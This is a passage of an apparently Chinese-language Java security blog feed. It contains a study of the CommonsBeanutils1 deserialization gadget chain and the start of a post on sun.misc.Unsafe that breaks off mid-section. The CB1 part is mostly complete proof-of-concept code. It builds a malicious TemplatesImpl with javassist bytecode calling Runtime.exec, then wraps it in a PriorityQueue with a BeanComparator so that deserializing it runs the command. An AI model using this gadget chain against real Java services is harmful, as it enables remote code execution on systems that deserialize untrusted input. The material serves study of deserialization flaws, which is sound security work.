class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h4 id="关键类-12"><a href="#关键类-12" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">BeanComparator</span><br><span class="hljs-attribute">PropertyUtils</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">PriorityQueue</span><br></code></pre></td></tr></table></figure><h4 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h4><p>什么是 JavaBean，一个类：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">所有属性为<span class="hljs-keyword">private</span><br>提供getter和setter读取<span class="hljs-keyword">private</span>属性<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils.Beandemo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getId</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">(String name, <span class="hljs-keyword">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="PropertyUtils"><a href="#PropertyUtils" class="headerlink" title="PropertyUtils"></a>PropertyUtils</h4><p>common-beanutils 提供了<code>PropertyUtils.getProperty</code>可以直接调用任意 JavaBean 的 getter</p><blockquote><p>Exception in thread “main” java.lang.NoClassDefFoundError: org/apache/commons/logging/LogFactory<br>at org.apache.commons.beanutils.ConvertUtilsBean.<init>(ConvertUtilsBean.java:157)<br>at org.apache.commons.beanutils.BeanUtilsBean.<init>(BeanUtilsBean.java:117)<br>at org.apache.commons.beanutils.BeanUtilsBean$1.initialValue(BeanUtilsBean.java:68)<br>    at org.apache.commons.beanutils.ContextClassLoaderLocal.get(ContextClassLoaderLocal.java:153)<br>    at org.apache.commons.beanutils.BeanUtilsBean.getInstance(BeanUtilsBean.java:80)<br>    at org.apache.commons.beanutils.PropertyUtilsBean.getInstance(PropertyUtilsBean.java:114)<br>    at org.apache.commons.beanutils.PropertyUtils.getProperty(PropertyUtils.java:426)<br>    at CommonsBeanutils.Beandemo.Demo.main(Demo.java:9)<br>Caused by: java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory<br>    at java.net.URLClassLoader.findClass(URLClassLoader.java:381)<br>    at java.lang.ClassLoader.loadClass(ClassLoader.java:424)<br>    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331)<br>at java.lang.ClassLoader.loadClass(ClassLoader.java:357)<br>… 8 more</p></blockquote><p>在 pom.xml 添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils.Beandemo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException </span>&#123;<br>        User user = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-number">1</span>);<br>        System.out.println(PropertyUtils.getProperty(user, <span class="hljs-string">&quot;name&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>纵观使用到了<code>TemplatesImpl</code>的链，都是调用了<code>TemplatesImpl.newTransformer</code>或者<code>TemplatesImpl.getOutputProperties</code>，两者的作用域都是 public；其中<code>getOutputProperties</code>内部调用了<code>newTransformer</code></p><p>这里注意到<code>getOutputProperties</code>是一个 getter，<code>TemplatesImpl</code>是一个 JavaBean</p><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><span class="hljs-keyword">import</span> org.apache.commons.lang3.RandomStringUtils;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CB1poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException </span>&#123;<br>        Random random = <span class="hljs-keyword">new</span> Random();<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        String suffix = RandomStringUtils.randomAlphabetic(<span class="hljs-number">5</span>);<br>        suffix = Character.toUpperCase(suffix.charAt(<span class="hljs-number">0</span>)) + suffix.substring(<span class="hljs-number">1</span>).toLowerCase();<br>        Long timestamp = System.currentTimeMillis();<br>        String prefix = Long.toString(timestamp);<br>        CtClass ctClass = cp.makeClass(random.nextInt() + prefix.substring(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>) + suffix);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        ctClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br><br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        PropertyUtils.getProperty(templatesimpl, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Gadget-12"><a href="#Gadget-12" class="headerlink" title="Gadget"></a>Gadget</h3><p>如何延长<code>PropertyUtils.getProperty</code>，查找用法发现在<code>BeanComparator.compare</code>有调用到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">( Object o1, Object o2 )</span> </span>&#123;<br><br>    <span class="hljs-keyword">if</span> ( property == <span class="hljs-keyword">null</span> ) &#123;<br>        <span class="hljs-comment">// compare the actual objects</span><br>        <span class="hljs-keyword">return</span> comparator.compare( o1, o2 );<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        Object value1 = PropertyUtils.getProperty( o1, property );<br>        Object value2 = PropertyUtils.getProperty( o2, property );<br>        <span class="hljs-keyword">return</span> comparator.compare( value1, value2 );<br>    &#125;<br>    <span class="hljs-keyword">catch</span><br>        ...<br></code></pre></td></tr></table></figure><p>很显然，当 o1 是<code>TemplatesUImpl</code>对象时，property 是<code>outputProperties</code>，链子就通了</p><p>comparator？等等，CC2 好像有<code>TransformingComparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(newTransformer);<br>PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>Object[] queue_array = <span class="hljs-keyword">new</span> Object[]&#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br><br>setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, queue_array);<br>setFieldValue(queue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>setFieldValue(queue, <span class="hljs-string">&quot;comparator&quot;</span>, transformingComparator);<br></code></pre></td></tr></table></figure><p><code>PriorityQueue.readObject-&gt;heapify-&gt;siftDown-&gt;siftDownUsingComparator</code>然后就调用到了<code>comparator.compare</code>，CC2 用<code>TransformingComparator</code>的时候反射修改的<code>comparator</code>，这里当然也可以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.lang3.RandomStringUtils;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CB1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException </span>&#123;<br>        Random random = <span class="hljs-keyword">new</span> Random();<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        String suffix = RandomStringUtils.randomAlphabetic(<span class="hljs-number">5</span>);<br>        suffix = Character.toUpperCase(suffix.charAt(<span class="hljs-number">0</span>)) + suffix.substring(<span class="hljs-number">1</span>).toLowerCase();<br>        Long timestamp = System.currentTimeMillis();<br>        String prefix = Long.toString(timestamp);<br>        CtClass ctClass = cp.makeClass(random.nextInt() + prefix.substring(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>) + suffix);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        ctClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br><br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        BeanComparator comparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><span class="hljs-comment">//        BeanComparator comparator = new BeanComparator();</span><br><span class="hljs-comment">//        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);</span><br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br>        Object[] queue_array = &#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, queue_array);<br>        setFieldValue(queue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;comparator&quot;</span>, comparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>SLF4J</strong></p>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/03/15/Unsafe/"/>
    <url>/2023/03/15/Unsafe/</url>
    
    <content type="html"><![CDATA[<h1 id="sun-misc-Unsafe"><a href="#sun-misc-Unsafe" class="headerlink" title="sun.misc.Unsafe"></a>sun.misc.Unsafe</h1><p>本文参考：<a href="http://mishadoff.com/blog/java-magic-part-4-sun-dot-misc-dot-unsafe/%EF%BC%8Chttps://blog.csdn.net/zyzzxycj/article/details/89877863">http://mishadoff.com/blog/java-magic-part-4-sun-dot-misc-dot-unsafe/，https://blog.csdn.net/zyzzxycj/article/details/89877863</a></p><p>Java对内存的管理很严格，<a href="https://blog.csdn.net/bandaoyu/article/details/83418583%EF%BC%8CUnsafe%E7%B1%BB%E5%8F%AF%E4%BB%A5%E7%AA%81%E7%A0%B4JVM%EF%BC%8C%E5%AE%83%E5%88%86%E9%85%8D%E7%9A%84%E5%86%85%E5%AD%98%E9%9C%80%E8%A6%81%E6%89%8B%E5%8A%A8free(%E4%B8%8D%E8%A2%ABGC%E5%9B%9E%E6%94%B6)%EF%BC%8C%E5%AE%83%E4%B8%8D%E6%98%AFJ2SE%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%8C%E5%B1%9E%E4%BA%8Esun.*API">https://blog.csdn.net/bandaoyu/article/details/83418583，Unsafe类可以突破JVM，它分配的内存需要手动free(不被GC回收)，它不是J2SE的一部分，属于sun.*API</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/568153-20191216214607494-455490214.png"></p><h2 id="Unsafe类实例化"><a href="#Unsafe类实例化" class="headerlink" title="Unsafe类实例化"></a>Unsafe类实例化</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220310141213354.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220310141414128.png"></p><p>可见必须是ClassLoader加载的类，然后返回标记为<code>private</code>的theUnsafe实例</p><p>Unsafe方法有105种方法，分类如下：</p><ul><li><p>Info</p><p>Just returns some low-level memory information.</p><ul><li><code>addressSize</code></li><li><code>pageSize</code></li></ul></li><li><p>Objects</p><p>Provides methods for object and its fields manipulation.</p><ul><li><code>allocateInstance</code></li><li><code>objectFieldOffset</code></li></ul></li><li><p>Classes</p><p>Provides methods for classes and static fields manipulation.</p><ul><li><code>staticFieldOffset</code></li><li><code>defineClass</code></li><li><code>defineAnonymousClass</code></li><li><code>ensureClassInitialized</code></li></ul></li><li><p>Arrays</p><p>Arrays manipulation.</p><ul><li><code>arrayBaseOffset</code></li><li><code>arrayIndexScale</code></li></ul></li><li><p>Synchronization</p><p>Low level primitives for synchronization.</p><ul><li><code>monitorEnter</code></li><li><code>tryMonitorEnter</code></li><li><code>monitorExit</code></li><li><code>compareAndSwapInt</code></li><li><code>putOrderedInt</code></li></ul></li><li><p>Memory</p><p>Direct memory access methods.</p><ul><li><code>allocateMemory</code></li><li><code>copyMemory</code></li><li><code>freeMemory</code></li><li><code>getAddress</code></li><li><code>getInt</code></li><li><code>putInt</code></li></ul></li></ul><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><h3 id="Avoid-initialization"><a href="#Avoid-initialization" class="headerlink" title="Avoid initialization"></a>Avoid initialization</h3><p>当创建一个类实例却不需要调用其构造函数(<strong>或构造函数私有</strong>)、初始化代码以及绕过各种JVM安全检查等等</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Field theUnsafe = Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafe.setAccessible(<span class="hljs-keyword">true</span>);<br>        Unsafe unsafe = (Unsafe) theUnsafe.get(<span class="hljs-keyword">null</span>);<br><br>        A a1 = (A) unsafe.allocateInstance(A.class);<br>        System.out.println(a1.getNum);<span class="hljs-comment">//打印结果为0</span><br><br>        <span class="hljs-comment">//bypass</span><br>        a1.setNum(<span class="hljs-number">666</span>);<br>        System.out.println(a1.getNum());<span class="hljs-comment">//打印结果为666</span><br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> num = <span class="hljs-number">123</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">A</span><span class="hljs-params">()</span> </span>&#123;<br>            <span class="hljs-keyword">this</span>.num = <span class="hljs-number">2333</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getNum</span><span class="hljs-params">()</span></span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.num;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setNum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num)</span> </span>&#123;<br>            <span class="hljs-keyword">this</span>.num = num;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>allocateInstance()</code>方法根本没有进入构造方法，在单例模式下很危险</p><h3 id="Memory-corruption"><a href="#Memory-corruption" class="headerlink" title="Memory corruption"></a>Memory corruption</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 